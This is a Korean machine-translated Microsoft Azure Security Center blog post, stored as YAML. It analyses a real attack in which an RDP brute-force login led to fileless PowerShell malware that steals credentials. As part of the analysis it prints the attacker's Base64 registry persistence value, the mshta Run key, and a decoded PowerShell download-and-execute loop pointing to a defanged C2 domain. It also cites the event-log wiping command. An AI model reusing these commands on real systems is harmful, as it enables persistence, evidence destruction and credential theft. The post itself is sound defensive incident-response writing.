### YamlMime:Yaml
ms.openlocfilehash: e5507376f130f7bf83059be515c06eab36e5b6bd
ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 03/11/2022
ms.locfileid: "139906756"
Slug: how-azure-security-center-unveils-suspicious-powershell-attack
Title: Azure Security Center에서 의심스러운 PowerShell 공격을 공개하는 방법
Summary: NCSAM(국가 사이버 보안 인식의 달)을 기념하여 Azure Security Center가 탐지, 조사 및 완화에 도움을 준 실제 공격을 강조하는 새로운 게시물이 시리즈의 새 게시물로 추가되었습니다. 이 게시물은 PowerShell을 사용하여 악성 코드를 실행하고 사용자 자격 증명을 수집하는 공격에 관한 것입니다.
Content: >-
  <p><a href="https://www.dhs.gov/national-cyber-security-awareness-month">NCSAM(국가 사이버 보안 인식의 달)</a>을 기념하여, Azure Security Center가 탐지, 조사 및 완화에 도움을 준 실제 공격을 강조하는 새로운 게시물이 시리즈의 새로운 게시물을 제공합니다. 이 게시물은 PowerShell을 사용하여 악성 코드를 실행하고 사용자 자격 증명을 수집하는 공격에 관한 것입니다. 그러나 우리가 뛰어 들&rsquo;기 전에 Security Center가 다음을 감지 한 시리즈의 다른 블로그 게시물을 요약합니다.</p>


  <ul>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/">무차별 암호 대입 공격 SQL</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/">비트 코인 마이닝 공격</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-ddos-attack-using-cyber-threat-intelligence/">사이버 위협 인텔리전스를 사용한 DDoS 공격</a></li>
   <li><a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-aids-in-detecting-good-applications-being-used-maliciously/">악의적으로 사용되는 좋은 애플리케이션</a></li>
  </ul>


  <p>이 게시물&rsquo;에서는 Azure Security Center에서 검색하고 팀에서 조사한 또 다른 흥미로운 실제 공격 시나리오를 안내합니다. 영향을 받는 회사의 이름, 모든 컴퓨터 이름 및 모든 사용자 이름이 개인 정보를 보호하기 위해 변경되었습니다. 이 특정 공격은 PowerShell을 사용하여 암호 도용, 키 입력 로깅, 클립보드 스크래핑 및 화면 캡처를 통해 자격 증명 정보를 수집하는 것을 목표로 메모리 내 악성 코드를 실행했습니다. Well&rsquo;은 RDP Force 공격으로 시작하여 레지스트리에서 ASEP(영구 자동 시작)의 설정 및 구성을 초래한 손상 단계를 매핑합니다. 이 사례 연구는 공격의 역학에 대한 인사이트와 사용자 환경에서 유사한 공격을 감지하고 방지하는 방법에 대한 권장 사항을 제공합니다.</p>


  <h2>초기 Azure Security Center 경고 및 세부 정보</h2>


  <p>인터넷에 연결된 컴퓨터의 원격 관리가 진행되는 한 해커는 무차별 암호 대입 공격을 통해 암호를 해독할 수 있도록 RDP(원격 데스크톱 프로토콜)와 같은 원격 관리 서비스를 검색하기 위한 노력을 계속해 왔습니다. 이 사례는 대규모 고객&rsquo; Azure Security Center 콘솔에서 시작되며, RDP 무차별 암호 대입 활동과 의심스러운 PowerShell 활동에 대한 경고를 받았습니다.</p>


  <p>아래의 Azure Security Center 스크린샷에서 <em><em>Failed</em> RDP 무차별 암호 대입 공격</em>&rdquo; 경고 다음에는 사용자가 사용자 암호를 추측한 후 RDP를 통해 로그온했음을 나타내는 단일 &ldquo;<em>성공적인 RDP 무차별 암호 대입 공격</em>&rdquo; 경고 &ndash; 가 표시될 때 시간 &ldquo; 순으로 진행 상황을 추적할 수 있습니다. 이 악의적인 무차별 암호 대입 로그온 이후에는 비정상적인 PowerShell 활동에 대한 몇 가지 경고가 표시됩니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/90722730-642a-446c-8230-d06c10fd484b.png"><img alt="image" border="0" height="278" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/ca4160ef-25b1-4d32-b5fa-ad03c873c35a.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="1094"></a></p>


  <p>초기 성공적인 RDP 무차별 암호 대입 공격 경고를 살펴보면 공격 시간, 손상된 계정, 시도가 시작된 공격 IP 주소(이 경우 이탈리아) 및 Microsofts&rsquo; Threat Intel &ldquo;RDP Brute Forcing&rdquo; 보고서에 대한 링크가 표시됩니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a81cf2ba-1323-4a80-85bb-58e0f81ce36d.png"><img alt="image" border="0" height="675" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/165a0a97-1132-4de8-a9b5-72414d8dccef.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="441"></a></p>


  <p><br>

  로그온이 성공하면 후속 심각도 경고로 드릴다운할 때 Azure Security Center는 성공적으로 로그온한 후 공격자가 시작한 각 명령줄을 시간순으로 표시합니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/0d85bb4a-46ab-4c8c-a284-f756b9c3683e.jpg"><img alt="Alerts_Combined" border="0" height="630" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/fe8a2292-8dd3-46e0-83fb-20660889a49f.jpg" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="Alerts_Combined" width="1024"></a></p>


  <h2>공격자 활동의 초기 손상 및 세부 정보</h2>


  <p>경고에서 제공하는 정보로 무장한 조사 팀은 고객과 협력하여 공격자가 처음 로그온한 시점부터 가져온 계정 로그(이벤트 ID 4624) 프로세스 생성 로그(이벤트 ID 4688)를 검사했습니다. 초기 로그온 데이터에서 다양한 사용자 이름 및 암호 조합을 사용하는 지속적인 RDP 무차별 암호 대입 시도가 표시됩니다. 이러한 시도에 실패한 대부분의 경우 <strong>이벤트 ID 4625</strong> (계정이 로그온하지 못함), <strong>상태 코드가 0xc000006d</strong> (로그온 시도가 잘못됨) 및 <strong>0xc0000064 하위 상태 코드</strong> (지정된 계정이 없음)가 발생합니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/22c0c0aa-5158-43d6-a7cf-2bf69edb5be4.png"><img alt="image" border="0" height="233" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/7494eaa0-b009-4162-ac94-38ee56b70e79.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="1092"></a></p>


  <p>09-06에서 오전 10시 13분 경에 Substatus 코드가 변경되기 시작합니다. 이제 사용자 이름 &ldquo;ContosoAdmin&rdquo; 을 사용하면 다른 상태 코드인 <strong>0xc000006a</strong> (잘못된 암호)가 표시됩니다. 그러면 ContosoAdmin&rdquo; 계정을 &ldquo;사용하여 유형 3 로그온 및 유형 10(원격 대화형) 로그온이 성공합니다. 로그온은 이탈리아의 IP 주소(<strong>188.125.100.233</strong>)에서 시작된 것으로 보입니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/f6abaed4-564a-4989-a7c9-48b3fd0388c3.png"><img alt="image" border="0" height="110" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/19d11aef-d2cc-4a68-8475-2f26df546bce.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="1240"></a></p>


  <p>로그온 후 프로세스 만들기 작업을 확인합니다. 공격자는 먼저 &ldquo; 현재 로그온한 사용자가 누구인지 표시하는 <strong>whoami</strong>&rdquo; 명령을 실행합니다. 그런 다음<strong>, net group Domain Admins /domain 명령을 사용하여 Domain Admins 그룹의 &ldquo;멤버를 나열합니다&rdquo;</strong>.&ldquo;&rdquo; 그 다음에 &ldquo; 는 모든 원격 데스크톱 서비스 세션을 표시하는 <strong>qwinsta</strong>&rdquo; 명령이 잇습니다. 그런 다음 Taskmgr(Windows 작업 관리자)을 시작하여 프로세스 및 서비스를 보거나 관리합니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a1267819-cb20-4bc8-b208-f68002c8a43e.png"><img alt="image" border="0" height="152" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/26d3cb9f-f0dc-4f5d-9957-930e4d8ff707.png" style="border-image: none; width: 1375px; height: 130px; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="imageAbout" width="1398"></a> 1분 후 다른 PowerShell 명령이 실행됩니다. 이 명령은 Deflate 압축 알고리즘에서 추가로 래핑되는 Base64로 인코딩된 문자열로 난독 처리됩니다.</p>


  <p>참고: 이&rsquo; 블로그의 뒷부분에서 Base64를 디코딩할 때 이 명령이 수행하는 작업을 자세히 살펴보겠습니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a3633dd4-af2b-4a00-95bc-96a9c09f7e97.png"><img alt="image" border="0" height="262" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/cb43a223-6b11-4331-a832-7535a67e3d75.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="1400"></a></p>


  <p>약 3분 후 공격자가 컴퓨터에서 로그오프합니다. 그러나 로그오프하기 전에 모든 이벤트 로그를 지워서 트랙을 정리하려고 시도합니다. 이 작업은 기본 제공 <strong>wevtutil.exe(Windows </strong> 이벤트 명령줄 유틸리티)를 사용하여 수행됩니다. 첫째, 모든 이벤트 로그는 el&rdquo; 또는 enum-logs 스위치로 &ldquo;열거됩니다&rdquo;&ldquo;. 그런 다음 cl&rdquo; 또는 &ldquo;clear-log 스위치를 사용하여 모든 이벤트 로그&rdquo;를 &ldquo;지웁니다. 다음은 공격자가 시작한 이벤트 지우기 명령의 일부입니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/f63fb0ec-2183-48ba-88e8-16e4a29f07bc.png"><img alt="image" border="0" height="462" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/77629ebd-7e6b-48b0-a403-034fc8faadfb.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="1401"></a></p>


  <h2>Base64로 인코딩된 PowerShell 명령을 자세히 살펴보기</h2>


  <p>공격자&rsquo; 초기 명령에서 인코딩된 Base64 부분을 디코딩하면 다음을 표시하는 더 많은 Base64 인코딩 명령이 표시됩니다.</p>


  <ul>
   <li>Base64 난독 처리 중첩</li>
   <li>명령 실행의 모든 수준은 난독 처리됩니다.</li>
   <li>지속성 메커니즘으로 레지스트리 전용 ASEP(자동 시작 확장성 지점)를 만들었습니다.</li>
   <li>레지스트리에 저장된 악성 코드 매개 변수입니다.</li>
   <li>명령 실행은 &ldquo;ASEP 및 매개 변수가 시스템 레지스트리에만 있으므로 파일 또는 NTFS 아티팩트가 없는 메모리&rdquo; 에서 발생합니다.</li>
  </ul>


  <p>다음은&rsquo; 공격자가 실행한 초기 명령입니다.</p>


  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9c8d6e69-4fd0-40b0-af7b-f4a1a2694bba.png"><img alt="image" border="0" height="263" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/8b8819f8-48be-4986-a0b4-67a5059bf966.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="943"></a><br>

  <a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/4278a65f-96cf-4287-ad4e-716ca83915e6.png"><img alt="image" border="0" height="84" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/66836ec7-871f-401d-bfc0-6a4f86ad3ca8.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; margin-right: auto; margin-left: auto; float: none; display: block; background-image: none;" title="이미지" width="54"></a></p>


  <p align="center">Base64를 디코딩하면 레지스트리 항목 및 디코딩할 더 많은 Base64 문자열이 표시됩니다.&hellip;</p>


  <p align="center"><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/4c87cb2a-abd5-43c2-a655-351ef4b5bb81.png"><img alt="image" border="0" height="208" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/37059866-c34a-4a15-b765-7f413dc427cc.png" style="border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; display: inline; background-image: none;" title="이미지" width="949"></a></p>


  <p align="center"><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/a9837031-794b-4d2b-8921-603dc3e7a0ab.png"><img alt="image" border="0" height="84" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/9cb8d705-05ee-4d37-8d65-6c2d6ea6a6f6.png" style="margin: 0px; border-image: none; padding-top: 0px; padding-right: 0px; padding-left: 0px; display: inline; background-image: none;" title="이미지" width="54"></a></p>


  <p>이러한 중첩된 Base64 값을 디코딩하면 명령이 다음을 수행하는 것으로 확인됩니다.</p>


  <ul>
   <li>이 명령은 먼저 HKLM\Software\Microsoft\Windows\CurrentVersion 아래 SeCert&rdquo;라는 &ldquo;레지스트리 위치에서 읽을 후속 명령에 대한 매개 변수 정보를 저장합니다.</li>
  </ul>


  <pre class="prettyprint">

  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion]

  &quot;SeCert&quot;=&quot;dwBoAGkAbABlACgAMQApAHsAdAByAHkAewBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALg

  BEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBkAG0AcwBlAHIAdgBlAHIAcwAuAGMAbwBtAC8AJwArACgAWwBjAGgAYQBy

  AF0AKAA4ADUALQAoAC0AMwA3ACkAKQApACkAfQBjAGEAdABjAGgAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAfQB9AA==&quot;

  </pre>


  <ul>
   <li>위의 레지스트리 키의 Base64 값은 악성 C2(명령 및 제어) 도메인(<strong>mdmservers[.] 에서 다운로드 명령으로 디코딩됩니다. com</strong>).</li>
  </ul>


  <pre class="prettyprint">

  while(1){try{IEX(New-Object Net.WebClient).DownloadString(&#39;hxxp[:]//mdmservers[.]com/&#39;+([char](85-(-37))))}catch{Start-Sleep -s 10}}</pre>


  <ul>
   <li>그런 다음 공격자&rsquo; 명령은 HKLM\Software\Microsoft\Windows\CurrentVersion\Run&rdquo; 키 아래에 &ldquo;SophosMSHTA&ldquo;라는 &rdquo;레지스트리 ASEP(자동 시작 확장성 지점)를 통해 지속성 메커니즘을 만듭니다.</li>
  </ul>


  <pre class="prettyprint">

  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]

  &quot;SophosMSHTA&quot;=&quot;mshta vbscript:CreateObject(\&quot;Wscript.Shell\&quot;).Run(\&quot;powershell.exe -c \&quot;\&quot;$x=$((gp HKLM:Software\\Microsoft\\Windows\\CurrentVersion SeCert).SeCert);powershell -E $x\&quot;\&quot;\&quot;,0,True)(window.close)&quot;</pre>


  <ul>
   <li>이 레지스트리 지속성은 컴퓨터를 시작하거나 다시 시작할 때마다 악성 명령이 시작되도록 합니다.</li>
   <li>레지스트리 ASEP는 Microsoft 스크립팅 엔진(mshta.exe)을 시작합니다.</li>
   <li>Mshta.exe PowerShell.exe 실행한 다음 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion -&gt; &rdquo;SeCert&rdquo; 값을 읽고 디코딩합니다.</li>
   <li>SeCert의 레지스트리 값은 powerShell에 &#39;hxxp[:]//mdmservers[.]에서 악성 스크립트를 다운로드하고 시작하도록 지시합니다. com&rsquo;.</li>
  </ul>


  <h2>악성 코드 다운로드 및 실행</h2>


  <p>공격자가 지속성 메커니즘을 설정했고 로그오프한 후 호스트 컴퓨터의 다음 다시 시작은 PowerShell을 시작하여 &#39;hxxp[:]//mdmservers[.] 에서 악성 페이로드를 다운로드하고 시작합니다. com&#39;. 이 악성 스크립트에는 특정 기능을 수행하는 다양한 섹션이 포함되어 있습니다. 아래 표에서는 악성 페이로드의 주요 기능을 자세히 설명합니다.</p>


  <table border="0" cellpadding="2" cellspacing="0" width="1191">
   <tbody>
    <tr>
     <td valign="top" width="1189">동작</td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>클립보드에서 콘텐츠를 긁어 내고 출력을 다음 위치에 저장합니다.</p>

     <p align="center"><em>%temp%\Applnsights_VisualStudio.txt</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>다음 위치에 대한 모든 키 입력을 캡처합니다.</p>

     <p align="center"><em>%temp%\key.log</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>초기 화면 캡처를 수행하고 .jpg 다음 위치에 저장합니다.</p>

     <p align="center"><em>%temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>특정 재무 또는 계정 자격 증명 관련 키워드가 입력될 때 후속 화면 캡처를 사용하고 .jpg 다음 위치에 저장합니다.</p>

     <p align="center"><em>%temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>Google Chrome 브라우저가 설치되어 있는지 확인합니다. 그렇다면 Chrome 캐시에서 모든 암호를 수집하고 다음 위치에 저장합니다.</p>

     <p align="center"><em>%temp%\Chrome.log</em></p>
     </td>
    </tr>
    <tr>
     <td valign="top" width="1189">
     <p>Mozilla Firefox 브라우저가 설치되어 있는지 확인합니다. 그렇다면 Firefox 캐시에서 모든 암호를 수집하고 다음 위치에 저장합니다.</p>

     <p align="center"><em>%temp%\Firefox.log</em></p>
     </td>
    </tr>
   </tbody>
  </table>


  <h2>모든 항목 요약</h2>


  <p>따라서 이 조사에서 지금까지 본 내용을&rsquo; 요약해 보겠습니다&rsquo;.</p>


  <ol>
   <li>초기 수신은 성공적인 RDP 무차별 암호 대입 공격 시 관리자 계정이 손상될 때 발생합니다.</li>
   <li>그런 다음 공격자는 부팅 시 실행되는 레지스트리 ASEP를 설정하는 Base64 난독 제거된 PowerShell 명령을 실행합니다.</li>
   <li>그런 다음 공격자는 wevtutil.exe -cl &lt;eventlogname&gt; 명령을&nbsp; 사용하여 모든 이벤트 로그를 삭제하여 활동 증거를 지웁니다.</li>
   <li>영향을 받는 호스트가 시작되거나 다시 부팅되면 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run에서 악성 레지스트리 ASEP가 시작됩니다.</li>
   <li>레지스트리 ASEP는 Microsoft 스크립팅 엔진(mshta.exe)을 시작합니다.</li>
   <li>Mshta.exe 차례로 PowerShell.exe 실행하여 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion -&gt; &rdquo;SeCert 값을 읽고 디코딩합니다.&rdquo;</li>
   <li>SeCert&rdquo;의 &ldquo;레지스트리 값은 powerShell에 &#39;hxxp[:]//mdmservers[.]에서 악성 스크립트를 다운로드하고 시작하도록 지시합니다. Com&rsquo;</li>
   <li>hxxp[:]//mdmservers[.]의 악성 코드 com은 다음을 수행합니다.
   <ul>
    <li>클립보드에서 %temp%\Applnsights_VisualStudio.txt로 콘텐츠를 긁어냅니다.</li>
    <li>%temp%\key.log에 대한 모든 키 입력을 캡처합니다.</li>
    <li>초기 화면 캡처를 수행하고 .jpg %temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg 저장합니다.</li>
    <li>특정 재무 또는 계정 자격 증명 관련 키 단어를 입력할 때 후속 화면 캡처를 사용하고 .jpg 다음 위치에 저장합니다. %temp%\39F28DD9-0677-4EAC-91B8-2112B1515341\yyyymmdd_hhmmss.jpg</li>
    <li>Google Chrome 브라우저가 설치되어 있는지 확인합니다. 그렇다면 Chrome 캐시에서 모든 암호를 수집하고 %temp%\Chrome.log에 저장합니다.</li>
    <li>Mozilla Firefox 브라우저가 설치되어 있는지 확인합니다. 그렇다면 Firefox 캐시에서 모든 암호를 수집하고 %temp%\Firefox.log에 저장합니다.</li>
   </ul>
   </li>
  </ol>


  <p>이 공격의 결과는 레지스트리에서 자동으로 시작되고, 메모리에서 실행되며, 키 입력, 브라우저 암호, 클립보드 데이터 및 스크린샷을 수집하는 맬웨어를 훔치는 정보입니다.</p>


  <h2>Azure Security Center가 이 모든 것을 포착한 방법</h2>


  <p>공격자가 자신의 활동을 은폐하기 위해 특별한 수단을 겪은 것이 분명합니다. 레지스트리에 난독 처리되고 저장된 명령 매개 변수를 사용하여 기본 제공 Windows 실행 파일(PowerShell.exe, Mshta.exe, Wevtutil.exe)을 사용한 모든 프로세스 실행을 보장하고, 모든 이벤트 로그를 삭제하여 해당 트랙을 지웁니다. 그러나 이러한 노력으로 인해 Azure Security Center가 이 악의적인 활동을 검색, 수집 및 보고하는 것을 막지는 못했습니다.</p>


  <p>이 블로그의 시작 부분에서 보았듯이 Azure Security Center는 이 공격의 모든 단계를 감지하여 초기 RDP 무차별 암호 대입 공격에 대한 세부 정보를 제공하고 공격자가 발급한 다양한 단계에서 모든 명령을 공개했습니다. 또한 경고&rsquo;에서 난독 분석된 모든 명령줄이 해독, 디코딩 및 공격의 각 단계에서 명확한 텍스트로 표시되었음을 알 수 있습니다. 이 중요하고 시간을 절약하는 정보는 보안 응답 조사자와 시스템 관리자&ldquo;가 무슨 일이 일어났는가? &ldquo;&rdquo;언제 이런 일이 일어났는가?&rdquo;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;&rsquo;&rdquo;&nbsp; 또한 조사자는 조직의 다른 호스트가 이 손상된 호스트의 횡적 이동을 통해 손상되었는지 여부를 확인할 수도 있습니다. 이 공격의 더 큰 그림을 보는 것은 또한 그들이 후에 무엇이었는지와 같은 &ldquo;동기 질문에 대답하는 데 도움이 될 수 있습니까?&rdquo; 우리의 경우, 기본 목적은 재정적 또는 지적 이익의 목표로 자격 증명 도용 것으로 보인다.</p>


  <p>모든 조사에서 Azure Security Center는 초기 수신/손상 벡터, 공격 원본, 가능한 횡적 이동 및 공격 범위와 같은 중요한 세부 정보를 결정하는 데 중요한 역할을 했습니다. 또한 Security Center는 파일 시스템 덮어쓰기 또는 로그 보존/스토리지 제한으로 인해 시간이 지남에 따라 손실될 수 있는 아티팩트를 자세히 설명합니다. Azure Security Centers&rsquo;는 최신 기계 학습 및 빅 데이터 분석을 사용하여 다양한 원본에서 데이터를 수집, 저장, 분석 및 해독할 수 있으므로 보안 분석가, 인시던트 응답자 및 법의학 전문가 모두에게 매우 중요합니다.</p>


  <h2>권장되는 수정 및 완화 단계</h2>


  <p>초기 손상은 쉽게 추측할 수 있는 암호를 가진 사용자 계정에 대한 RDP 무차별 암호 대입 공격 성공의 결과입니다. 이로 인해 영향을 받는 호스트 컴퓨터가 완전히 손상되었습니다. 이 경우 호스트는 재정적 또는 지적 이익을 목표로 자격 증명 도용의 주요 목적을 가진 악의적인 PowerShell 코드로 구성되었습니다. Microsoft는 사용 가능한 로그 원본, 호스트 기반 분석 및 필요한 경우 포렌식 분석을 검토하여 손상의 그림을 작성하는 데 도움이 되는 초기 손상의 원인을 조사하는 것이 좋습니다. Azure IaaS(Infrastructure as a Service) 및 VM(Virtual Machines)의 경우 실행 중인 컴퓨터 및 디스크 이미징 기능에 데이터 드라이브를 연결하는 기능을 포함하여 데이터 수집을 용이하게 하기 위한 몇 가지 기능이 있습니다. 또한 호스트에서 실행되는 악성 소프트웨어를 식별하고 제거하는 데 도움이 되도록 맬웨어 보호 소프트웨어를 사용하여 검사를 수행하는 것이 좋습니다. 손상된 호스트에서 횡적 이동이 식별된 경우 수정 작업은 이러한 호스트로 확장되어야 합니다.</p>


  <p>피해자 호스트를 깨끗하게 확인할 수 없거나 손상의 근본 원인을 식별할 수 없는 경우 중요한 데이터를 백업하고 새 가상 머신으로 마이그레이션하는 것이 좋습니다. 또한 다시 연결을 방지하기 위해 네트워크에 다시 배치하기 전에 새 호스트 또는 수정된 호스트를 강화해야 합니다. 그러나 이 작업을 즉시 수행할 수 없다는 점을 이해하면 다음 수정/예방 단계를 구현하는 것이 좋습니다.</p>


  <ul>
   <li><strong>암호 정책</strong>: 공격자는 일반적으로 단어 목록 및 스마트 규칙 집합을 활용하여 사용자 암호를 지능적으로 자동으로 추측하는 널리 사용 가능한 도구를 사용하여 무차별 암호 대입 공격을 시작합니다. 따라서 첫 번째 단계는 모든 VM에 복잡한 암호를 활용하는 것입니다. 자주 암호 변경을 적용하는 복잡한 암호 정책이 적용되어야 합니다. <a href="https://technet.microsoft.com/en-us/library/ff741764.aspx">암호 정책을 적용하기 위한 모범 사례에</a> 대해 자세히 알아봅니다.</li>
   <li><strong>엔드포인트</strong>: 엔드포인트를 사용하면 인터넷에서 VM과 통신할 수 있습니다. Azure 환경에서 VM을 만들 때 VM, 원격 데스크톱 및 PowerShell을 관리하는 데 도움이 되는 두 개의 엔드포인트가 기본적으로 만들어집니다. 필요하지 않은 엔드포인트를 제거하고 필요한 경우에만 추가하는 것이 좋습니다. 엔드포인트가 열려 있는 경우 가능할 때마다 사용되는 공용 포트를 변경하는 것이 좋습니다. 새 Windows VM을 만들 때 기본적으로 원격 데스크톱의 공용 포트는 자동&rdquo;으로 &ldquo;설정됩니다. 즉, 임의의 공용 포트가 자동으로 생성됩니다. <a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/classic/setup-endpoints">Azure의 클래식 Windows 가상 머신에서 엔드포인트를 설정하는 방법에 대한</a> 자세한 내용을 알아봅니다.</li>
   <li><strong>네트워크 보안 그룹 사용</strong>: Azure Security Center는 NSG(네트워크 보안 그룹)를 사용하도록 설정하는 것이 좋습니다(아직 사용하도록 설정되지 않은 경우&rsquo;). NSG에는 Virtual Network의 VM 인스턴스에 대한 네트워크 트래픽을 허용하거나 거부하는 ACL(액세스 제어 목록) 규칙 목록이 포함되어 있습니다. 엔드포인트 ACL을 사용하면 해당 관리 프로토콜에 대한 액세스를 허용하려는 IP 주소 또는 주소의 CIDR 서브넷을 제어할 수 있습니다. <a href="https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-nsg">네트워크 보안 그룹을 사용하여 네트워크 트래픽을 필터링</a>하고 <a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-enable-network-security-groups">Azure Security Center에서 네트워크 보안 그룹을 사용하도록 설정하는</a> 방법에 대해 자세히 알아봅니다.</li>
   <li><strong>관리에 VPN 사용</strong>: VPN 게이트웨이는 공용 연결을 통해 암호화된 트래픽을 온-프레미스 위치에 보내는 가상 네트워크 게이트웨이의 한 유형입니다. 또한 VPN Gateway를 사용하여 Microsoft 네트워크를 통해 Azure 가상 네트워크 간에 암호화된 트래픽을 보낼 수 있습니다. Azure 가상 네트워크와 온-프레미스 사이트 간에 암호화된 네트워크 트래픽을 보내려면 가상 네트워크에 대한 VPN 게이트웨이를 만들어야 합니다. <a href="https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#site-to-site-and-multi-site-ipsecike-vpn-tunnel">사이트 간</a> 및 지점 및 <a href="https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#a-namep2sapoint-to-site-vpn-over-sstp">사이트</a> 간 게이트웨이 연결을 모두 사용하면 공용 엔드포인트를 완전히 제거하고 보안 VPN 연결을 통해 Virtual Machine에 직접 연결할 수 있습니다.</li>
   <li><strong>NLA(네트워크 수준 인증)</strong> : NLA를 호스트 컴퓨터에서 사용하여 도메인 인증된 사용자로부터 원격 데스크톱 세션만 만들 수 있습니다. NLA를 사용하려면 연결 사용자가 서버를 사용하여 세션을 설정하기 전에 인증해야 하므로 무차별 암호 대입 공격, 사전 공격 및 암호 추측 공격이 완화됩니다.</li>
   <li><strong>JIT(Just-In-Time) 네트워크 액세스</strong>: Azure Security Center의 Just-In-Time VM(가상 머신) 액세스를 사용하여 Azure VM에 대한 인바운드 트래픽을 보호하고 잠글 수 있습니다. JIT 네트워크 액세스를 사용하면 포트가 열려 있는 시간을 제한하여 무차별 암호 대입 공격에 대한 노출을 줄이고 결과적으로 공격에 대한 노출을 줄이면서 필요할 때 VM에 쉽게 연결할 수 있습니다.&nbsp;</li>
  </ul>


  <h2>리소스</h2>


  <p>PowerShell 팀은 PowerShell을 가장 보안이 투명한 스크립팅 언어 및 셸로 만드는 많은 작업을 수행했습니다. 다음 링크에서는 PowerShell 문제를 해결하는 방법에 대해 자세히 설명합니다.</p>


  <ul>
   <li><a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/">https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/</a></li>
   <li><a href="https://www.youtube.com/watch?v=ZkJ64_tQxPU">https://www.youtube.com/watch?v=ZkJ64_tQxPU</a></li>
